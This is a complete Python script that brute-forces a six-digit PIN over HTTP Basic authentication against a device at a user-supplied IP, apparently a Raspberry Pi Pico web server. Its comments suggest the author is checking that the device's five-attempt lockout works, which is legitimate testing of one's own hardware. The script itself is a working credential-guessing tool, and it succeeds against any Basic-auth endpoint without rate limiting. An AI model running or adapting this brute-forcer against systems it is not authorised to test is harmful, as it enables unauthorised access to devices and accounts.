import urllib.request
import urllib.error
import base64
import time
import sys

# --- [BLOCK 1: INPUTS] ---
target_ip = input("Enter Pico IP: ")
target_user = input("Enter Username: ")

def attempt_login(pwd):
    """Sends a request with a 6-digit PIN."""
    auth_str = base64.b64encode(f"{target_user}:{pwd}".encode()).decode()
    headers = {"Authorization": f"Basic {auth_str}", "Connection": "close"}
    try:
        req = urllib.request.Request(f"http://{target_ip}/", headers=headers)
        with urllib.request.urlopen(req, timeout=1) as res:
            if res.status == 200: return "FOUND"
    except urllib.error.HTTPError as e:
        if e.code == 401: return "WRONG"
        if e.code == 403: return "BLOCKED"
    except: return "ERROR"
    return "NONE"

# --- [BLOCK 2: GENERATOR LOOP] ---
print(f"[*] Cracking 6-digit PIN for {target_user}...")

# This generates numbers 000000 to 999999
for i in range(1000000):
    pin = f"{i:06d}" # Formats as 000001, 000002, etc.
    
    sys.stdout.write(f"\r[*] Testing: {pin} ")
    sys.stdout.flush()
    
    result = attempt_login(pin)
    
    if result == "FOUND":
        print(f"\n[+] SUCCESS! PIN is: {pin}")
        break
    elif result == "BLOCKED":
        print(f"\n[!] ATTACK STOPPED: Blocked by Pico after 5 fails.")
        print("[*] The lockout mechanism is working.")
        break
    
    # Slight pause to let the Pico recover
    time.sleep(0.05)